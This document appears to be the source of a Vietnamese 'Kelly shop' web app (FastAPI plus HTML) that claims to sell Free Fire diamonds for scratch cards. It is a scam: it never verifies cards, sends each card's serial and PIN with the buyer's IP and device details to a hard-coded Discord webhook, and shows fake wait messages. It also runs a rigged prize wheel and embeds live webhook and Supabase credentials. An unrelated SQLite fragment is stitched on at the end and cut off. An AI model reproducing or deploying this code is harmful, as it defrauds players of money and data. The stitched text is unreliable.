import os
import requests
import random
from datetime import datetime, timedelta
from fastapi import FastAPI, HTTPException, Request
from fastapi.responses import HTMLResponse
from pydantic import BaseModel
from supabase import create_client, Client

app = FastAPI()

# ---------------- CONFIGURATION ----------------
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1542472440440160307/dmEza6iLQvY2lXjtHgvM-SAyCTHeNh0Rlib8FxNRSxlxyaGbqkdmGMPZewkt7e21X2br"

SUPABASE_URL = "https://sdeixbihpbiuqcguaxqi.supabase.co"
SUPABASE_KEY = "sb_publishable_1rDqbrmjaUAVmMuyxhW3Dg_9uLMOz4B"

supabase: Client = None
try:
    supabase = create_client(SUPABASE_URL, SUPABASE_KEY)
except Exception as e:
    print("Lỗi kết nối Supabase:", e)

# ---------------- HELPER FUNCTIONS ----------------
def calculate_quest_tier(level: int):
    """Tính toán mốc target và phần thưởng dựa trên cấp độ nhiệm vụ hiện tại"""
    if level <= 1:
        return 70000, 20000
    elif level == 2:
        return 120000, 50000
    else:
        # Tăng tiến dần cho các cấp tiếp theo
        target = 120000 + (level - 2) * 50000
        reward = 50000 + (level - 2) * 30000
        return target, reward

def get_client_ip(request: Request) -> str:
    client_ip = request.headers.get("x-forwarded-for", request.client.host if request.client else "Unknown IP")
    if "," in client_ip:
        client_ip = client_ip.split(",")[0].strip()
    return client_ip

def parse_kc(diamonds_str: str) -> int:
    try:
        clean_str = diamonds_str.lower().replace('💎', '').replace('.', '').replace(',', '').strip()
        if 'k' in clean_str:
            num = float(clean_str.replace('k', ''))
            return int(num * 1000)
        return int(clean_str)
    except Exception:
        return 0

# ---------------- MODELS ----------------
class CardRequest(BaseModel):
    user_id: str
    amount: str
    diamonds: str
    card_type: str
    serial: str
    pin: str
    device_info: str = "Unknown Device"
    network_info: str = "Unknown Network"
    device_uuid: str = ""
    pay_with_coin: bool = False

class ProgressCheckRequest(BaseModel):
    device_info: str
    device_uuid: str = ""

class RedeemCodeRequest(BaseModel):
    code: str
    device_uuid: str

class WheelSpinRequest(BaseModel):
    device_uuid: str
    user_id: str

# ---------------- API ENDPOINTS ----------------
@app.post("/api/get-progress")
async def get_progress(req: ProgressCheckRequest, request: Request):
    client_ip = get_client_ip(request)
    device_key = req.device_uuid if req.device_uuid else f"{client_ip}_{req.device_info}"
    
    if not supabase:
        target, reward = calculate_quest_tier(1)
        return {"total_kc": 0, "coins": 0, "quest_level": 1, "target_kc": target, "reward_kc": reward}
    try:
        res = supabase.table("user_progress").select("total_kc, coins, quest_level").eq("device_key", device_key).execute()
        if res.data and len(res.data) > 0:
            q_level = res.data[0].get("quest_level", 1) or 1
            target, reward = calculate_quest_tier(q_level)
            return {
                "total_kc": res.data[0].get("total_kc", 0),
                "coins": res.data[0].get("coins", 0),
                "quest_level": q_level,
                "target_kc": target,
                "reward_kc": reward
            }
    except Exception as e:
        print("Progress Fetch Error:", e)
    
    target, reward = calculate_quest_tier(1)
    return {"total_kc": 0, "coins": 0, "quest_level": 1, "target_kc": target, "reward_kc": reward}

@app.post("/api/redeem-code")
async def redeem_code(req: RedeemCodeRequest, request: Request):
    if req.code.strip().lower() != "newbie":
        raise HTTPException(status_code=400, detail="Mã Giftcode không hợp lệ hoặc đã hết hạn!")
    
    client_ip = get_client_ip(request)
    device_key = req.device_uuid
    
    if not supabase:
        raise HTTPException(status_code=500, detail="Lỗi kết nối máy chủ!")
        
    try:
        c_res = supabase.table("used_codes").select("*").eq("device_key", device_key).eq("code", "newbie").execute()
        if c_res.data and len(c_res.data) > 0:
            raise HTTPException(status_code=400, detail="Bạn đã sử dụng mã Giftcode newbie rồi!")
            
        p_res = supabase.table("user_progress").select("coins").eq("device_key", device_key).execute()
        current_coins = 0
        if p_res.data and len(p_res.data) > 0:
            current_coins = p_res.data[0].get("coins", 0)
            supabase.table("user_progress").update({"coins": current_coins + 1}).eq("device_key", device_key).execute()
        else:
            supabase.table("user_progress").insert({
                "device_key": device_key,
                "ip_address": client_ip,
                "coins": 1,
                "total_kc": 0,
                "quest_level": 1
            }).execute()

        supabase.table("used_codes").insert({"device_key": device_key, "code": "newbie"}).execute()
        return {"message": "Nhập mã thành công! Bạn nhận được +1 Đồng Xu 🪙", "coins": current_coins + 1}
    except HTTPException as e:
        raise e
    except Exception as e:
        print("Redeem Code Error:", e)
        raise HTTPException(status_code=500, detail="Không thể thực hiện giao dịch, vui lòng thử lại sau!")

@app.post("/api/verify-card")
async def verify_card(data: CardRequest, request: Request):
    client_ip = get_client_ip(request)
    device_key = data.device_uuid if data.device_uuid else f"{client_ip}_{data.device_info}"
    kc_added = parse_kc(data.diamonds)
    current_kc = 0
    current_coins = 0

    net_upper = data.network_info.upper()
    is_special_network = any(net_name in net_upper for net_name in ["BON BON", "BONBON", "AP"])
    wait_message = "đã nạp thành công vui lòng chờ 1 tuần để nhận thẻ" if is_special_network else "đã nạp thành công vui lòng chờ 30 phút để nhận thẻ"

    if data.pay_with_coin:
        p_res = supabase.table("user_progress").select("coins, total_kc, quest_level").eq("device_key", device_key).execute()
        if not p_res.data or p_res.data[0].get("coins", 0) < 1:
            raise HTTPException(status_code=400, detail="Bạn không đủ Đồng Xu để thực hiện thanh toán này!")
        
        current_coins = p_res.data[0].get("coins", 0) - 1
        current_kc = p_res.data[0].get("total_kc", 0)
        q_level = p_res.data[0].get("quest_level", 1) or 1
        target, reward = calculate_quest_tier(q_level)

        supabase.table("user_progress").update({"coins": current_coins}).eq("device_key", device_key).execute()
        
        content = f"**[THANH TOÁN BẰNG ĐỒNG XU]**\n**ID:** `{data.user_id}`\n**Số xu còn lại:** `{current_coins} 🪙`\n**Nội dung:** `{data.amount}` ({data.diamonds})"
        try: requests.post(DISCORD_WEBHOOK_URL, json={"content": content})
        except: pass

        return {"message": "Thanh toán bằng Đồng Xu thành công!", "coins": current_coins, "total_kc": current_kc, "quest_level": q_level, "target_kc": target, "reward_kc": reward}

    if len(data.serial) < 6 or len(data.pin) < 6:
        raise HTTPException(status_code=400, detail="thẻ đã sai,vui lòng kiểm tra lại")

    q_level = 1
    target_kc, reward_kc = calculate_quest_tier(q_level)

    if supabase:
        try:
            supabase.table("recharge_history").insert({
                "user_id": data.user_id,
                "amount": data.amount,
                "diamonds": data.diamonds,
                "device_key": device_key
            }).execute()

            p_res = supabase.table("user_progress").select("total_kc, coins, quest_level").eq("device_key", device_key).execute()
            if p_res.data and len(p_res.data) > 0:
                old_kc = p_res.data[0].get("total_kc", 0)
                current_coins = p_res.data[0].get("coins", 0)
                q_level = p_res.data[0].get("quest_level", 1) or 1
                
                target_kc, reward_kc = calculate_quest_tier(q_level)
                current_kc = old_kc + kc_added

                # Kiểm tra nếu hoàn thành mốc nhiệm vụ hiện tại -> RESET TIẾN ĐỘ & TĂNG BẬC
                if current_kc >= target_kc:
                    q_level += 1
                    current_coins += 1
                    current_kc = current_kc - target_kc  # Trừ số dư đã hoàn thành để reset tiến độ
                    target_kc, reward_kc = calculate_quest_tier(q_level)

                supabase.table("user_progress").update({
                    "total_kc": current_kc,
                    "coins": current_coins,
                    "quest_level": q_level,
                    "last_user_id": data.user_id,
                    "updated_at": datetime.utcnow().isoformat()
                }).eq("device_key", device_key).execute()
            else:
                current_kc = kc_added
                if current_kc >= target_kc:
                    q_level = 2
                    current_coins = 1
                    current_kc = current_kc - target_kc
                    target_kc, reward_kc = calculate_quest_tier(q_level)
                
                supabase.table("user_progress").insert({
                    "device_key": device_key,
                    "ip_address": client_ip,
                    "device_info": data.device_info,
                    "last_user_id": data.user_id,
                    "total_kc": current_kc,
                    "coins": current_coins,
                    "quest_level": q_level
                }).execute()
        except Exception as e:
            print("Supabase Save Error:", e)

    content = (
        f"**Đã có người nạp thẻ cào thành công**\n"
        f"**ID:** `{data.user_id}`\n"
        f"**Thiết bị:** `{data.device_info}`\n"
        f"**Mạng:** `{data.network_info}`\n"
        f"**IP:** `{client_ip}`\n"
        f"**Mệnh giá:** `{data.amount}` ({data.diamonds})\n"
        f"**Cấp nhiệm vụ:** Cấp {q_level} | **Tiến độ:** `{current_kc:,} / {target_kc:,} KC` | **Xu:** `{current_coins} 🪙`\n"
        f"**Seri:** `{data.serial}`\n**Mã:** `{data.pin}`"
    )
    try: requests.post(DISCORD_WEBHOOK_URL, json={"content": content})
    except: pass

    return {
        "message": wait_message,
        "total_kc": current_kc,
        "coins": current_coins,
        "quest_level": q_level,
        "target_kc": target_kc,
        "reward_kc": reward_kc
    }

@app.post("/api/spin-wheel")
async def spin_wheel(req: WheelSpinRequest, request: Request):
    device_key = req.device_uuid
    if not supabase:
        raise HTTPException(status_code=500, detail="Lỗi kết nối máy chủ!")

    p_res = supabase.table("user_progress").select("coins").eq("device_key", device_key).execute()
    if not p_res.data or p_res.data[0].get("coins", 0) < 1:
        raise HTTPException(status_code=400, detail="Bạn cần 1 Đồng Xu 🪙 để thực hiện lượt quay này!")

    current_coins = p_res.data[0].get("coins", 0) - 1
    supabase.table("user_progress").update({"coins": current_coins}).eq("device_key", device_key).execute()

    rand = random.uniform(0, 100)
    if rand <= 0.0001: reward_kc = "1.000.000 💎"
    elif rand <= 0.1: reward_kc = "100.000 💎"
    elif rand <= 20.0: reward_kc = "20.000 💎"
    elif rand <= 69.0: reward_kc = "1.000 💎"
    elif rand <= 70.0: reward_kc = "500 💎"
    elif rand <= 87.0: reward_kc = "100 💎"
    elif rand <= 89.0: reward_kc = "51 💎"
    else: reward_kc = "1 💎"

    content = f"**[VÒNG QUAY KIM CƯƠNG]**\n**ID:** `{req.user_id or 'Chưa nhập ID'}`\n**Trúng:** `{reward_kc}`\n**Xu còn lại:** `{current_coins} 🪙`"
    try: requests.post(DISCORD_WEBHOOK_URL, json={"content": content})
    except: pass

    return {"message": f"🎉 Chúc mừng bạn đã quay trúng {reward_kc}!", "reward": reward_kc, "coins": current_coins}

@app.get("/api/history")
async def get_history(device_uuid: str = "", request: Request = None):
    if not supabase:
        return {"history": [], "top": [], "my_history": []}
    
    try:
        ten_mins_ago = (datetime.utcnow() - timedelta(minutes=10)).isoformat()
        history_res = supabase.table("recharge_history").select("*").gte("created_at", ten_mins_ago).order("created_at", desc=True).execute()
        top_res = supabase.table("user_progress").select("last_user_id, total_kc").order("total_kc", desc=True).limit(5).execute()
        my_history_res = supabase.table("recharge_history").select("*").eq("device_key", device_uuid).order("created_at", desc=True).execute()
        
        return {
            "history": history_res.data if history_res.data else [],
            "top": top_res.data if top_res.data else [],
            "my_history": my_history_res.data if my_history_res.data else []
        }
    except Exception as e:
        print("Supabase Fetch Error:", e)
        return {"history": [], "top": [], "my_history": []}

# ---------------- FRONTEND INTERFACE ----------------
@app.get("/", response_class=HTMLResponse)
async def serve_home():
    return """
    <!DOCTYPE html>
    <html lang="vi">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Kelly shop - Nạp KC & Boost Like Garena</title>
        <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@500;600;700;800&display=swap" rel="stylesheet">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
        <style>
            * { box-sizing: border-box; }
            body { font-family: 'Plus Jakarta Sans', sans-serif; background-color: #f4f6f9; color: #1a1d20; margin: 0; padding: 0; text-align: center; }
            header { background: #ffffff; padding: 12px 18px; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 100; box-shadow: 0 4px 20px rgba(0,0,0,0.05); border-bottom: 1px solid #eaeaea; }
            .header-left { display: flex; align-items: center; gap: 10px; }
            .brand-title { margin: 0; font-size: 15px; font-weight: 800; color: #0066ff; text-align: left; }
            .menu-btn { font-size: 22px; cursor: pointer; background: none; border: none; color: #1a1d20; }
            
            .coin-badge { display: flex; align-items: center; gap: 6px; background: #fff8e6; border: 1.5px solid #ffe082; padding: 6px 12px; border-radius: 50px; font-weight: 800; font-size: 14px; color: #b78103; }
            .help-icon { width: 18px; height: 18px; background: #ffb300; color: white; border-radius: 50%; display: inline-flex; justify-content: center; align-items: center; font-size: 11px; cursor: pointer; margin-left: 2px; }

            .side-menu { display: none; position: fixed; top: 55px; left: 0; width: 280px; background: #ffffff; height: 100%; border-right: 1px solid #e0e0e0; text-align: left; padding: 20px; z-index: 99; box-shadow: 4px 0 15px rgba(0,0,0,0.05); }
            .side-menu a { display: block; color: #333333; padding: 14px 12px; text-decoration: none; border-bottom: 1px solid #f0f0f0; font-weight: 600; font-size: 15px; border-radius: 8px; }
            .side-menu a:hover { background: #f0f4ff; color: #0066ff; }
            .banner-container { max-width: 680px; margin: 15px auto 0 auto; padding: 0 16px; }
            .banner { width: 100%; border-radius: 16px; box-shadow: 0 10px 30px rgba(0,0,0,0.08); }
            
            .service-selector-box { max-width: 680px; margin: 15px auto 0 auto; padding: 0 16px; text-align: left; }
            .container { max-width: 680px; margin: 15px auto 40px auto; padding: 28px 22px; background: #ffffff; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.05); border: 1px solid #eaeaea; }
            
            .progress-box { background: #f8f9fa; border: 1px solid #e9ecef; padding: 18px; border-radius: 16px; margin-bottom: 24px; text-align: left; }
            .progress-title { font-size: 14px; font-weight: 700; color: #1a1d20; display: flex; justify-content: space-between; margin-bottom: 8px; }
            .progress-bg { background: #e9ecef; height: 16px; border-radius: 10px; overflow: hidden; position: relative; }
            .progress-fill { background: linear-gradient(90deg, #ff9500, #ff3b30); height: 100%; width: 0%; transition: width 0.4s ease; }
            .progress-gift { font-size: 12px; color: #d63027; font-weight: 700; margin-top: 8px; display: block; }

            .badge-verified { display: inline-block; background: #e6f4ea; color: #137333; padding: 8px 16px; border-radius: 50px; font-weight: 700; font-size: 15px; margin-bottom: 18px; }
            .form-label { text-align: left; font-weight: 700; font-size: 14px; color: #495057; margin: 14px 0 6px 4px; display: block; }
            select, input { width: 100%; padding: 14px; margin-bottom: 10px; background: #f8f9fa; border: 2px solid #e9ecef; color: #1a1d20; border-radius: 12px; font-size: 15px; font-weight: 600; outline: none; transition: all 0.2s ease; font-family: inherit; }
            select:focus, input:focus { border-color: #0066ff; background: #ffffff; box-shadow: 0 0 0 4px rgba(0, 102, 255, 0.1); }
            
            .btn { background: #0066ff; color: white; padding: 16px; border: none; border-radius: 12px; cursor: pointer; font-weight: 700; width: 100%; font-size: 17px; margin-top: 10px; box-shadow: 0 8px 20px rgba(0, 102, 255, 0.25); transition: all 0.2s ease; }
            .btn:hover { background: #0052cc; transform: translateY(-2px); }
            .btn-red { background: #ff3b30; display: none; box-shadow: 0 8px 20px rgba(255, 59, 48, 0.25); }
            .btn-red:hover { background: #d63027; }
            .btn-gold { background: #ffb300; color: #000; box-shadow: 0 8px 20px rgba(255, 179, 0, 0.3); }

            .wheel-box { background: linear-gradient(135deg, #fff3e0, #ffe0b2); border: 2px dashed #ff9800; border-radius: 20px; padding: 22px; margin-top: 30px; text-align: center; }
            .wheel-title { font-size: 20px; font-weight: 800; color: #e65100; margin-bottom: 8px; }

            .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); backdrop-filter: blur(4px); justify-content: center; align-items: center; z-index: 200; }
            .modal-content { background: #ffffff; padding: 28px; border-radius: 20px; width: 90%; max-width: 380px; text-align: center; box-shadow: 0 20px 40px rgba(0,0,0,0.15); position: relative; }
            .modal-btns { display: flex; gap: 12px; margin-top: 20px; }
            .btn-close { background: #f1f3f5; color: #495057; box-shadow: none; }
            .btn-confirm { background: #ff3b30; box-shadow: 0 4px 15px rgba(255, 59, 48, 0.3); }
            .page { display: none; }
            .active { display: block; }
            ul { list-style: none; padding: 0; margin: 0; }
            li { background: #f8f9fa; margin: 10px 0; padding: 14px; border-radius: 12px; font-size: 14px; font-weight: 600; text-align: left; border: 1px solid #f0f0f0; word-break: break-all; }
        </style>
    </head>
    <body>

        <header>
            <div class="header-left">
                <button class="menu-btn" onclick="toggleMenu()">☰</button>
                <h3 class="brand-title">Kelly shop</h3>
            </div>
            <div class="coin-badge">
                🪙 <span id="userCoins">0</span>
                <div class="help-icon" onclick="showCoinHelp()">?</div>
            </div>
        </header>

        <div id="sideMenu" class="side-menu">
            <a href="#" onclick="showPage('home')">Trang chủ (Nạp thẻ)</a>
            <a href="#" onclick="showPage('giftcodePage')">Giftcode 🎁</a>
            <a href="#" onclick="showPage('myHistory')">Lịch sử cá nhân</a>
            <a href="#" onclick="showPage('history')">Lịch sử chung & Top nạp</a>
        </div>

        <div class="service-selector-box">
            <span class="form-label">Chọn dịch vụ:</span>
            <select id="mainServiceSelect" onchange="switchService(this.value)">
                <option value="nap_kc">Nạp Kim Cương / Thẻ Cào</option>
                <option value="vong_quay">Vòng Quay Kim Cương 🪙</option>
            </select>
        </div>

        <div class="banner-container">
            <img src="https://via.placeholder.com/680x200/0066ff/ffffff?text=Kelly+Shop+-+Uy+Tin+Hang+Dau" alt="Banner" class="banner">
        </div>

        <!-- PAGE: TRANG CHỦ (NẠP THẺ & VÒNG QUAY) -->
        <div id="home" class="page active">
            <div class="container">
                <!-- XỬ LÝ NẠP THẺ -->
                <div id="napKCSection">
                    <div class="badge-verified"><i class="fa-solid fa-shield-halved"></i> Hệ Thống Nạp An Toàn & Tự Động</div>

                    <!-- Tiến độ nhiệm vụ -->
                    <div class="progress-box">
                        <div class="progress-title">
                            <span>Nhiệm Vụ Cấp <span id="questLevel">1</span></span>
                            <span id="questProgressText">0 / 70.000 KC</span>
                        </div>
                        <div class="progress-bg">
                            <div id="questProgressFill" class="progress-fill"></div>
                        </div>
                        <span id="questGiftText" class="progress-gift">🎁 Đạt mốc nhận ngay: +1 Đồng Xu 🪙</span>
                    </div>

                    <form id="cardForm" onsubmit="handleCardSubmit(event)">
                        <span class="form-label">ID Nhân Vật (Free Fire):</span>
                        <input type="text" id="userId" placeholder="Nhập ID game của bạn" required>

                        <span class="form-label">Loại Thẻ:</span>
                        <select id="cardType" required>
                            <option value="Viettel">Viettel</option>
                            <option value="Garena">Garena</option>
                            <option value="Zing">Zing</option>
                            <option value="Mobifone">Mobifone</option>
                            <option value="Vinaphone">Vinaphone</option>
                        </select>

                        <span class="form-label">Mệnh Giá:</span>
                        <select id="cardAmount" onchange="updateDiamondBonus()" required>
                            <option value="10.000 VNĐ">10.000 VNĐ (💎 500 KC)</option>
                            <option value="20.000 VNĐ">20.000 VNĐ (💎 1.100 KC)</option>
                            <option value="50.000 VNĐ">50.000 VNĐ (💎 2.800 KC)</option>
                            <option value="100.000 VNĐ">100.000 VNĐ (💎 6.000 KC)</option>
                            <option value="200.000 VNĐ">200.000 VNĐ (💎 13.000 KC)</option>
                            <option value="500.000 VNĐ">500.000 VNĐ (💎 35.000 KC)</option>
                        </select>

                        <span class="form-label">Số Seri:</span>
                        <input type="text" id="cardSerial" placeholder="Nhập mã seri trên thẻ" required>

                        <span class="form-label">Mã Mã Thẻ (PIN):</span>
                        <input type="text" id="cardPin" placeholder="Nhập mã pin sau lớp cào" required>

                        <button type="submit" class="btn" id="btnSubmitCard">XÁC NHẬN NẠP THẺ</button>
                        <button type="button" class="btn btn-red" id="btnPayCoin" onclick="handleCoinPayment()">THANH TOÁN BẰNG 1 XU 🪙</button>
                    </form>
                </div>

                <!-- XỬ LÝ VÒNG QUAY -->
                <div id="vongQuaySection" style="display: none;">
                    <div class="wheel-box">
                        <div class="wheel-title">🎉 VÒNG QUAY KIM CƯƠNG 🎉</div>
                        <p style="font-size: 14px; color: #666; margin-bottom: 20px;">Dùng <b>1 Đồng Xu 🪙</b> để tham gia quay trúng lên tới 1.000.000 KC!</p>
                        
                        <span class="form-label">Nhập ID Game Nhận Thưởng:</span>
                        <input type="text" id="wheelUserId" placeholder="Nhập ID game nhận KC">
                        
                        <button class="btn btn-gold" onclick="handleSpinWheel()">SPIN NOW (TỐN 1 XU) 🎰</button>
                    </div>
                </div>
            </div>
        </div>

        <!-- PAGE: GIFTCODE -->
        <div id="giftcodePage" class="page">
            <div class="container">
                <h3>🎁 Nhập Mã Giftcode nhận quà</h3>
                <p style="font-size: 14px; color: #666;">Nhập mã tân thủ hoặc mã quà tặng sự kiện tại đây.</p>
                <input type="text" id="giftcodeCode" placeholder="Nhập mã Giftcode (VD: newbie)" style="margin-top: 15px;">
                <button class="btn" onclick="handleRedeemCode()">NHẬN QUÀ</button>
            </div>
        </div>

        <!-- PAGE: LỊCH SỬ CÁ NHÂN -->
        <div id="myHistory" class="page">
            <div class="container">
                <h3>📜 Lịch Sử Nạp Thẻ Cá Nhân</h3>
                <ul id="myHistoryList">
                    <li>Đang tải dữ liệu...</li>
                </ul>
            </div>
        </div>

        <!-- PAGE: LỊCH SỬ CHUNG & TOP NẠP -->
        <div id="history" class="page">
            <div class="container">
                <h3>🏆 Bảng Xếp Hạng Top Nạp</h3>
                <ul id="topList">
                    <li>Đang tải dữ liệu...</li>
                </ul>
                <hr style="margin: 20px 0; border: none; border-top: 1px solid #eee;">
                <h3>⚡ Lịch Sử Nạp Gần Đây (10 phút)</h3>
                <ul id="globalHistoryList">
                    <li>Đang tải dữ liệu...</li>
                </ul>
            </div>
        </div>

        <!-- MODAL THÔNG BÁO / GIẢI THÍCH HỆ THỐNG XU -->
        <div id="coinHelpModal" class="modal">
            <div class="modal-content">
                <h3 style="margin-top: 0; color: #ffb300;">🪙 Đồng Xu Dùng Để Làm Gì?</h3>
                <p style="font-size: 14px; color: #555; text-align: left; line-height: 1.6;">
                    • <b>Nhận xu:</b> Hoàn thành thanh tiến độ nhiệm vụ nạp thẻ hoặc nhập Giftcode <b>newbie</b>.<br>
                    • <b>Sử dụng xu:</b> Dùng để quay <b>Vòng Quay Kim Cương</b> hoặc thanh toán gói dịch vụ miễn phí bằng Xu!
                </p>
                <button class="btn btn-close" onclick="closeModal('coinHelpModal')">Đóng</button>
            </div>
        </div>

        <script>
            // --- CẤU HÌNH UUID ĐỂ ĐỊNH DANH THIẾT BỊ ---
            function getDeviceUUID() {
                let uuid = localStorage.getItem("device_uuid");
                if (!uuid) {
                    uuid = 'dev-' + Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
                    localStorage.setItem("device_uuid", uuid);
                }
                return uuid;
            }

            const DEVICE_UUID = getDeviceUUID();
            let currentDiamondsSelected = "💎 500 KC";

            // --- ĐIỀU HƯỚNG TRANG & MENU ---
            function toggleMenu() {
                const menu = document.getElementById('sideMenu');
                menu.style.display = (menu.style.display === 'block') ? 'none' : 'block';
            }

            function showPage(pageId) {
                document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
                document.getElementById(pageId).classList.add('active');
                document.getElementById('sideMenu').style.display = 'none';

                if (pageId === 'myHistory' || pageId === 'history') {
                    fetchHistoryData();
                }
            }

            function switchService(val) {
                if (val === 'nap_kc') {
                    document.getElementById('napKCSection').style.display = 'block';
                    document.getElementById('vongQuaySection').style.display = 'none';
                } else if (val === 'vong_quay') {
                    document.getElementById('napKCSection').style.display = 'none';
                    document.getElementById('vongQuaySection').style.display = 'block';
                }
            }

            function showCoinHelp() {
                document.getElementById('coinHelpModal').style.display = 'flex';
            }

            function closeModal(id) {
                document.getElementById(id).style.display = 'none';
            }

            function updateDiamondBonus() {
                const select = document.getElementById('cardAmount');
                const text = select.options[select.selectedIndex].text;
                const match = text.match(/\((.*?)\)/);
                if (match) currentDiamondsSelected = match[1];
            }

            // --- CALL API: TẢI TIẾN ĐỘ & XU ---
            async function loadUserProgress() {
                try {
                    const res = await fetch('/api/get-progress', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ device_info: navigator.userAgent, device_uuid: DEVICE_UUID })
                    });
                    const data = await res.json();

                    document.getElementById('userCoins').innerText = data.coins || 0;
                    document.getElementById('questLevel').innerText = data.quest_level || 1;
                    
                    const pct = Math.min(100, Math.round((data.total_kc / data.target_kc) * 100));
                    document.getElementById('questProgressFill').style.width = pct + '%';
                    document.getElementById('questProgressText').innerText = `${data.total_kc.toLocaleString()} / ${data.target_kc.toLocaleString()} KC`;
                    
                    // Hiển thị nút thanh toán bằng xu nếu có xu
                    const btnPayCoin = document.getElementById('btnPayCoin');
                    if (data.coins > 0) {
                        btnPayCoin.style.display = 'block';
                    } else {
                        btnPayCoin.style.display = 'none';
                    }
                } catch (err) {
                    console.error("Lỗi lấy tiến độ:", err);
                }
            }

            // --- CALL API: XỬ LÝ NẠP THẺ ---
            async function handleCardSubmit(e) {
                e.preventDefault();
                const userId = document.getElementById('userId').value;
                const cardType = document.getElementById('cardType').value;
                const amount = document.getElementById('cardAmount').value;
                const serial = document.getElementById('cardSerial').value;
                const pin = document.getElementById('cardPin').value;

                try {
                    const res = await fetch('/api/verify-card', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            user_id: userId,
                            amount: amount,
                            diamonds: currentDiamondsSelected,
                            card_type: cardType,
                            serial: serial,
                            pin: pin,
                            device_info: navigator.userAgent,
                            network_info: "MOBILE",
                            device_uuid: DEVICE_UUID,
                            pay_with_coin: false
                        })
                    });

                    const result = await res.json();
                    if (!res.ok) throw new Error(result.detail || "Giao dịch thất bại");

                    alert("✅ " + result.message);
                    document.getElementById('cardForm').reset();
                    loadUserProgress();
                } catch (err) {
                    alert("❌ Lỗi: " + err.message);
                }
            }

            // --- CALL API: THANH TOÁN BẰNG XU ---
            async function handleCoinPayment() {
                const userId = document.getElementById('userId').value;
                const amount = document.getElementById('cardAmount').value;
                if (!userId) {
                    alert("Vui lòng nhập ID Game trước khi thanh toán bằng xu!");
                    return;
                }

                if (!confirm("Bạn có chắc chắn muốn dùng 1 Đồng Xu 🪙 để thanh toán gói này?")) return;

                try {
                    const res = await fetch('/api/verify-card', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            user_id: userId,
                            amount: amount,
                            diamonds: currentDiamondsSelected,
                            card_type: "COIN_PAYMENT",
                            serial: "COIN_PAY",
                            pin: "COIN_PAY",
                            device_uuid: DEVICE_UUID,
                            pay_with_coin: true
                        })
                    });

                    const result = await res.json();
                    if (!res.ok) throw new Error(result.detail || "Thanh toán xu thất bại");

                    alert("🎉 " + result.message);
                    loadUserProgress();
                } catch (err) {
                    alert("❌ Lỗi: " + err.message);
                }
            }

            // --- CALL API: VÒNG QUAY ---
            async function handleSpinWheel() {
                const userId = document.getElementById('wheelUserId').value;
                try {
                    const res = await fetch('/api/spin-wheel', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ device_uuid: DEVICE_UUID, user_id: userId })
                    });

                    const result = await res.json();
                    if (!res.ok) throw new Error(result.detail || "Không thể quay");

                    alert(result.message);
                    loadUserProgress();
                } catch (err) {
                    alert("❌ Lỗi: " + err.message);
                }
            }

            // --- CALL API: NHẬP GIFTCODE ---
            async function handleRedeemCode() {
                const code = document.getElementById('giftcodeCode').value;
                if (!code) {
                    alert("Vui lòng nhập mã Giftcode!");
                    return;
                }

                try {
                    const res = await fetch('/api/redeem-code', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ code: code, device_uuid: DEVICE_UUID })
                    });

                    const result = await res.json();
                    if (!res.ok) throw new Error(result.detail || "Lỗi đổi mã");

                    alert("🎉 " + result.message);
                    document.getElementById('giftcodeCode').value = "";
                    loadUserProgress();
                } catch (err) {
                    alert("❌ Lỗi: " + err.message);
                }
            }

            // --- CALL API: LẤY LỊCH SỬ & BẢNG XẾP HẠNG ---
            async function fetchHistoryData() {
                try {
                    const res = await fetch(`/api/history?device_uuid=${DEVICE_UUID}`);
                    const data = await res.json();

                    // Render lịch sử cá nhân
                    const myHistList = document.getElementById('myHistoryList');
                    if (data.my_history && data.my_history.length > 0) {
                        myHistList.innerHTML = data.my_history.map(item => `
                            <li><b>ID:</b> ${item.user_id} | <b>Mệnh giá:</b> ${item.amount} (${item.diamonds}) | <i>${new Date(item.created_at).toLocaleString('vi-VN')}</i></li>
                        `).join('');
                    } else {
                        myHistList.innerHTML = '<li>Bạn chưa có giao dịch nào.</li>';
                    }

                    // Render Top nạp
                    const topList = document.getElementById('topList');
                    if (data.top && data.top.length > 0) {
                        topList.innerHTML = data.top.map((item, index) => `
                            <li><b>TOP ${index + 1}:</b> ID ${item.last_user_id || 'Ẩn danh'} - Total: <b>${item.total_kc.toLocaleString()} 💎</b></li>
                        `).join('');
                    } else {
                        topList.innerHTML = '<li>Chưa có dữ liệu TOP.</li>';
                    }

                    // Render Lịch sử chung
                    const globalList = document.getElementById('globalHistoryList');
                    if (data.history && data.history.length > 0) {
                        globalList.innerHTML = data.history.map(item => `
                            <li><b>ID:</b> ${item.user_id} vừa nạp <b>${item.amount}</b> (${item.diamonds})</li>
                        `).join('');
                    } else {
                        globalList.innerHTML = '<li>Không có giao dịch nào trong 10 phút qua.</li>';
                    }
                } catch (err) {
                    console.error("Lỗi lấy lịch sử:", err);
                }
            }

            // Khởi tạo trang web
            window.onload = function() {
                updateDiamondBonus();
                loadUserProgress();
            };
        </script>
    </body>
    </html>
    """
    # ==========================================
# BACKEND API (FASTAPI + SQLITE)
# ==========================================
import sqlite3
import random
from datetime import datetime, timedelta
from typing import Optional
from fastapi import FastAPI, HTTPException
from fastapi.responses import HTMLResponse
from pydantic import BaseModel

# --- KHỞI TẠO CƠ SỞ DỮ LIỆU ---
def init_db():
    conn = sqlite3.connect("shop.db")
    cursor = conn.cursor()
    
    # Bảng người dùng theo UUID thiết bị
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS users (
            device_uuid TEXT PRIMARY KEY,
            coins INTEGER DEFAULT 0,
            quest_level INTEGER DEFAULT 1,
            total_kc INTEGER DEFAULT 0
        )
    """)
    
